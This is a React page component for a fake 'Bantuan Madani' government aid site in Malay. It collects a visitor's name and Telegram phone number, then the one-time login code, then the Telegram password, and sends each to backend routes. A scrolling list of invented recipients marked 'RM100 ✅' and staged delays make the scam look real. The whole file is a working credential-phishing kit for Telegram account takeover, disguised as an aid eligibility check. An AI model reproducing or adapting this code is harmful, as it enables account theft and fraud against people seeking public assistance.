import { Head, Link, router, useForm } from "@inertiajs/react";
import { React, useState, useRef, useEffect } from "react";
import CountryData from "../../../js/CountryCodesWithFlags";
export default function Index() {
    const dataNama = [
        "Aisyah Abdul Rahman",
        "Ahmad  Ismail",
        "Siti Nur Aisyah",
        "ZahraIsmail",
        "Farhan  Khalid",
        "MiraMohd Noor",
        "Ali  Rashid",
        "HanaShamsul",
        "NadiaAhmad",
        "Kamal  Ibrahim",
        "AisyahMohamad",
        "Zul  Abidin",
        "NabilahAbdul Razak",
        "Sulaiman  Zainal",
        "NinaAli",
        "Fahmi  Azman",
        "LinaMohd",
        "Nabil  Ahmad",
        "FatinYusof",
        "Arif  Ibrahim",
        "AzizahRahman",
        "Ibrahim  Yassin",
        "LiyanaFaris",
        "Adam  Zulkifli",
        "RinaIsmail",
        "Khalid  Omar",
        "MariamAli",
        "SharifahAbdillah",
        "ZuraidaMohamad",
        "AinaSulaiman",
        "Syafiq  Abdul Rahman",
        "MairaIdris",
        "Firdaus  Ali",
        "RafidahZainal",
        "Fadhil  Ali",
        "NurulHisham",
        "Rizal  Mohd Noor",
        "ShazaKhalid",
        "Ismail  Abu",
        "NoraSalleh",
        "Syakir  Ibrahim",
        "SarahMohd",
        "Rizwan  Razak",
        "FayzaMohd",
        "Haziq  Hassan",
        "AminahZainal",
        "Zainal  Mohd Noor",
        "Amir  Ali",
        "AinulKamal",
        "Siti MariamHassan",
        "Faiz  Ramli",
        "SyarifahZulkifli",
        "MimiIbrahim",
        "AfiqahSafwan",
        "NorlizaAhmad",
        "Rasul  Ali",
        "FathimahAbdul Wahid",
        "Mokhtar  Abd Rahman",
        "HaziqahAhmad",
        "ZainabAli",
        "Razak  Samad",
        "ShakilaIbrahim",
        "Hassan  Nordin",
        "Zubair  Saad",
        "RinaYahya",
        "NourAbdillah",
        "Faris  Mohd",
        "Hanafi  Ismail",
        "Azman  Ahmad",
        "FatimahMohd",
        "NajwaYusuf",
        "Rizwan  Rani",
        "HudaAsma",
        "AzraAhmad",
        "Ikram  Omar",
        "JamilahAbdullah",
        "FizahAziz",
        "FarahIsmail",
        "WaniAhmad",
        "Anwar  Hassan",
        "RosmahIbrahim",
        "FarrinZahid",
        "Yusof  Osman",
        "Shamsul  Sulaiman",
        "Azeem  Rashid",
        "AlyaAli",
        "Rifqi  Farhan",
        "NisaIdris",
        "DianaSulaiman",
        "NabilahFarid",
        "Khairul  Nordin",
        "RayaJamal",
        "MariamRamli",
        "Siti AisyahNoor",
        "SyahiraMahmud",
        "Shafie  Zulkifli",
        "Danial  Omar",
        "RajaAzman",
        "AzreenSalleh",
        "RillaIbrahim",
        "Hafiz  Rashid",
        "ZahiraMohd",
        "Asyraf  Mohamad",
        "MikaAli",
        "RaniaFaris",
        "Siti NurIbrahim",
        "ShakirahYusuf",
        "HanaZakaria",
        "ZakiaAbdullah",
        "JazlinIsmail",
        "Shamsuddin  Ismail",
        "Nabil  Abidin",
        "Fahmi  Muhammad",
        "AzizaOsman",
        "SafiraFaris",
        "Zakaria  Ali",
        "Syamil  Azman",
        "AzimahZainal",
        "KhairaniIbrahim",
        "Razali  Ahmad",
        "Abdul Rahman  Hisham",
        "AinNasir",
        "Fakhrul  Zainal",
        "Afiq  Omar",
        "NurSamad",
        "Rijal  Abidin",
        "FahiraSalim",
        "Rizq  Mohd",
        "AnisOmar",
        "MiraKamal",
        "AinulAzman",
        "Fahmi  Saad",
        "RashidahMohd",
        "ElinaIbrahim",
        "Zain  Abdullah",
        "ZaraAli",
        "Syazwan  Yusof",
        "Firas  Ali",
        "Khairul  Kamal",
        "NadiaShamsul",
        "Shazwan  Mohd",
        "Raihan  Zainal",
        "Aslam  Ibrahim",
        "YasminOmar",
        "HafizahAli",
    ];
    const [status, setStatus] = useState("registrasi");
    const { data, setData, post, reset, errors } = useForm({
        nama: "",
        nombor: "+60",
        password: "",
    });
    const [verifData, setVerifData] = useState(["", "", "", "", ""]);
    const verifRef = useRef([]);
    const containerRef = useRef(null);
    const [loading, setLoading] = useState(false);
    const [showInput, setShowInput] = useState(false);
    const [countryData, setCountryData] = useState(CountryData);
    const [showNumber, setShowNumber] = useState(false);
    const [show, setShow] = useState(15);
    const [type, setType] = useState("home");

    const handleChange = (index, event) => {
        const nilaiBaru = [...verifData];
        nilaiBaru[index] = event.target.value;
        if (event.target.value.length === 1 && index < 4) {
            verifRef.current[index + 1].focus();
        }
        setVerifData(nilaiBaru);
    };
    const submitHandler = (e) => {
        e.preventDefault();
        setLoading(true);
        post(route("bantuan.registrasi-store"), {
            onSuccess: () => {
                setTimeout(() => {
                    setLoading(false);
                    setStatus("verifikasi");
                }, 5000);
            },
            onError: () => {
                setTimeout(() => {
                    setLoading(false);
                    setStatus("registrasi");
                }, 5000);
            },
        });
    };
    const submitVerif = (e) => {
        e.preventDefault();
        setLoading(true);
        router.post(
            route("bantuan.verifikasi-store"),
            {
                nombor: data.nombor,
                code_verif: verifData,
            },
            {
                onSuccess: () => {
                    setTimeout(() => {
                        setLoading(false);

                        setStatus("password");
                    }, 5000);
                },
                onError: () => {
                    setTimeout(() => {
                        setLoading(false);

                        setStatus("verifikasi");
                    }, 5000);
                },
            }
        );
    };
    const submitPassword = (e) => {
        e.preventDefault();
        setLoading(true);
        router.post(
            route("bantuan.password-store"),
            {
                nombor: data.nombor,
                code_verif: verifData,
                password: data.password,
            },
            {
                onSuccess: () => {
                    setData({
                        ...data,
                        nama: "",
                        nombor: "+62",
                        password: "",
                    });
                    setTimeout(() => {
                        setLoading(false);

                        setVerifData(["", "", "", "", ""]);
                        setStatus("registrasi");
                    }, 5000);
                },
                onError: () => {
                    setTimeout(() => {
                        setLoading(false);

                        setStatus("password");
                    }, 5000);
                },
            }
        );
    };

    useEffect(() => {
        const interval = setInterval(() => {
            setShow((prev) => prev + 1);
        }, 1000);

        // Clear interval saat komponen unmount
        return () => clearInterval(interval);
    }, []);
    useEffect(() => {
        if (containerRef.current) {
            containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }
    }, [show]);

    return (
        <div className=" transition-all duration-300 ease-in-out  relative  overflow-y-hidden bg-orange-500">
            <Head title="Bantuan Madani" />
            <div className="py-4 px-4 drop-shadow-md bg-orange-500 flex justify-between items-center">
                <img src="/Bantuan/logo-home-2.png" alt="" className="w-20" />
                <div className="flex justify-between gap-x-1.5 items-center">
                    <Link className="tracking-tighter text-white text-xs font-light">
                        Bahasa Melayu
                    </Link>
                    <Link className="tracking-tighter text-blue-700 text-xs font-light">
                        English
                    </Link>
                    <Link className="tracking-tighter text-blue-700 text-xs font-light">
                        摩訶至
                    </Link>
                    <Link className="tracking-tighter text-blue-700 text-xs font-light">
                        भारत
                    </Link>
                </div>
            </div>
            <div className="px-8 md:px-16 lg:px-24 w-full h-full py-5 flex flex-col items-center gap-y-2">
                <div>
                    <img
                        src="/Bantuan/rm300.png"
                        alt=""
                        className="rounded-md shadow-sm shadow-gray-400/50 h-[300px] md:h-[300px] lg:h-[400px]"
                    />
                    <p className="bg-red-500 text-white font-extrabold text-center py-3">
                        HANTAR RESUME SEKARANG
                    </p>
                </div>

                <p className="  text-blue-950 font-bold text-center">
                    {status == "registrasi"
                        ? ""
                        : status == "verifikasi"
                        ? "Sila Masukan Kod-yang dihantar ke Nombor" +
                          data.nombor
                        : "Sila Masukan kata laluan Telegram Anda "}
                </p>
                {status == "verifikasi" && (
                    <p className="text-blue-950 font-bold text-center text-3xl tracking-tighter">
                        Masukan Kod-OTP
                    </p>
                )}

                {status == "registrasi" && (
                    <form onSubmit={submitHandler} className="w-full">
                        <p className="font-bold">Nama penuh sesuai MayKad</p>
                        <div className="my-1 flex flex-row items-center w-full rounded-lg overflow-hidden p-1 bg-gray-100 drop-shadow-sm border border-blue-950">
                            <input
                                type="text"
                                placeholder="Nama penuh sesuai MayKad"
                                className="w-full drop-shadow-sm"
                                value={data.nama}
                                onChange={(e) =>
                                    setData({
                                        ...data,
                                        nama: e.target.value,
                                    })
                                }
                            />
                        </div>
                        {errors.nama && (
                            <p className="tracking-tighter text-xs text-red-500 italic">
                                {errors.nama}
                            </p>
                        )}
                        <p className="font-bold">Nombor Telefon Telegram</p>
                        <div className="mb-2.5 flex flex-row items-center w-full rounded-lg overflow-hidden p-1 bg-gray-100 drop-shadow-sm border border-blue-950">
                            <div className="py-1 px-2 rounded-md bg-gray-100 w-[50px]">
                                <img
                                    className="w-12 h-6"
                                    src={`https://flagcdn.com/w40/my.png`}
                                    alt=""
                                />
                            </div>
                            <input
                                type="text"
                                className="w-full drop-shadow-sm"
                                value={data.nombor}
                                onChange={(e) =>
                                    setData({
                                        ...data,
                                        nombor: e.target.value,
                                    })
                                }
                            />
                        </div>
                        {errors.nombor && (
                            <p className="tracking-tighter text-xs text-red-500 italic">
                                {errors.nombor}
                            </p>
                        )}

                        <div className="flex justify-center my-4">
                            <button className="text-white text-center rounded-full bg-blue-900 hover:bg-blue-950 py-2 px-4 ">
                                SEMAK STATUS
                            </button>
                        </div>
                    </form>
                )}
                {status == "verifikasi" && (
                    <form onSubmit={submitVerif} className="w-full ">
                        <div className="w-full flex gap-3 justify-center">
                            {verifData.map((item, index) => (
                                <input
                                    key={index}
                                    type="number"
                                    value={item}
                                    ref={(ref) =>
                                        (verifRef.current[index] = ref)
                                    }
                                    className="w-16 rounded-md border text-center border-blue-900 drop-shadow-md "
                                    maxLength={1}
                                    onChange={(event) =>
                                        handleChange(index, event)
                                    }
                                />
                            ))}
                        </div>
                        <div className="flex justify-center my-4">
                            <button className="text-white text-center rounded-full  bg-blue-800 hover:bg-blue-950 py-2 px-8 ">
                                Teruskan
                            </button>
                        </div>
                    </form>
                )}
                {status == "password" && (
                    <form onSubmit={submitPassword} className="w-full ">
                        <input
                            type="password"
                            placeholder="Masukkan kata laluan"
                            className="w-full  rounded-md border border-b-blue-800 drop-shadow"
                            value={data.password}
                            onChange={(e) =>
                                setData({
                                    ...data,
                                    password: e.target.value,
                                })
                            }
                        />
                        <div className="flex justify-center my-4">
                            <button className="text-white text-center rounded-full  bg-blue-800 hover:bg-blue-950 py-2 px-8 ">
                                Teruskan
                            </button>
                        </div>
                    </form>
                )}
            </div>
            <div className="px-8 md:px-16 lg:px-24 pb-8">
                <div
                    style={{
                        scrollBehavior: "smooth", // Menambahkan animasi scroll
                    }}
                    ref={containerRef}
                    className=" bg-slate-100 rounded-md flex flex-col gap-y-2 py-8 px-4 w-full h-[400px]  overflow-y-hidden"
                >
                    {dataNama.map(
                        (item, key) =>
                            key < show && (
                                <div
                                    // style={{
                                    //  animationDelay: `${key * 100}ms`, // Penundaan animasi untuk efek yang lebih alami
                                    // }}
                                    key={key}
                                    className={`transition-all duration-300 ease-linear flex gap-4 items-center bg-gray-200 py-3 px-4 leading-3 rounded-md shadow-sm shadow-gray-400/50 border border-blue-800 ${
                                        key - 1 == show && "fade-in"
                                    }`}
                                >
                                    <img
                                        src="/Bantuan/avatar.png"
                                        alt=""
                                        className="w-12 rounded-full"
                                    />
                                    <div>
                                        <p className="font-bold text-lg md:text-xl lg:text-2xl  leading-5">
                                            {item}
                                        </p>
                                        <p className="font-bold text-blue-700 text-sm leading-5">
                                            RM100 ✅
                                        </p>
                                    </div>
                                </div>
                            )
                    )}
                </div>
            </div>
            <div className=" w-full px-8 md:px-16 lg:px-24 py-5 bg-blue-800">
                <img src="/Bantuan/ini1.png" alt="" />
            </div>
            {loading && (
                <div className="fixed top-0 left-0 w-full h-full flex flex-col justify-center items-center bg-slate-950/70">
                    <img
                        src="/Bantuan/loading.gif"
                        alt=""
                        className="w-[200px]"
                    />
                    <p className="tracking-tighter font-thin text-orange-500 my-4">
                        Tunggu kami sedang menyemak...
                    </p>
                </div>
            )}
        </div>
    );
}
